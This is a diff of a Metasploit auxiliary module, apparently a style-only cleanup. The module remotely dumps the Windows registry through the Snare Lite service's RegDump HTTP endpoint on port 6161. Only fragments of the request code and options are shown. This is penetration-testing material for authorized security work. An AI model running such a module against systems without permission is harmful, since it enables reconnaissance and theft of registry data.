@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,28 +10,27 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
-  HttpFingerprint = { :pattern => [ /SNARE/ ] }
+  HttpFingerprint = { pattern: [ /SNARE/ ] }.freeze
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Snare Lite for Windows Registry Access',
-      'Description'   => %q{
-          This module uses the Registry Dump feature of the Snare Lite
-        for Windows service on 6161/TCP to retrieve the Windows registry.
-        The Dump Registry functionality is unavailable in Snare Enterprise.
+                      'Name'          => 'Snare Lite for Windows Registry Access',
+                      'Description'   => %q(
+                          This module uses the Registry Dump feature of the Snare Lite
+                        for Windows service on 6161/TCP to retrieve the Windows registry.
+                        The Dump Registry functionality is unavailable in Snare Enterprise.
 
-        Note: The Dump Registry functionality accepts only one connected
-        client at a time. Requesting a large key/hive will cause the service
-        to become unresponsive until the server completes the request.
-      },
-      'Platform'      => 'win',
-      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
-      'License'       => MSF_LICENSE,
-      'References'    =>
-        [
-          [ 'URL', 'https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf' ]
-        ]
-    ))
+                        Note: The Dump Registry functionality accepts only one connected
+                        client at a time. Requesting a large key/hive will cause the service
+                        to become unresponsive until the server completes the request.
+                      ),
+                      'Platform'      => 'win',
+                      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
+                      'License'       => MSF_LICENSE,
+                      'References'    =>
+                        [
+                          [ 'URL', 'https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf' ]
+                        ]))
 
     register_options(
       [
@@ -40,7 +40,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('REG_DUMP_KEY', [ false, 'Retrieve this registry key and all sub-keys', 'HKLM\\HARDWARE\\DESCRIPTION\\System' ]),
         OptBool.new('REG_DUMP_ALL', [false, 'Retrieve the entire Windows registry', false]),
         OptInt.new('TIMEOUT', [true, 'Timeout in seconds for downloading each registry key/hive', 300])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -67,10 +68,10 @@ class MetasploitModule < Msf::Auxiliary
       vars_get['str_SubKey'] = key
     end
     res = send_request_cgi({
-      'uri' => normalize_uri('RegDump'),
-      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-      'vars_get' => vars_get
-    }, datastore['TIMEOUT'])
+                             'uri' => normalize_uri('RegDump'),
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'vars_get' => vars_get
+                           }, datastore['TIMEOUT'])
     if !res
       fail_with(Failure::Unreachable, "#{peer} - Connection failed")
     elsif res.code && res.code == 401
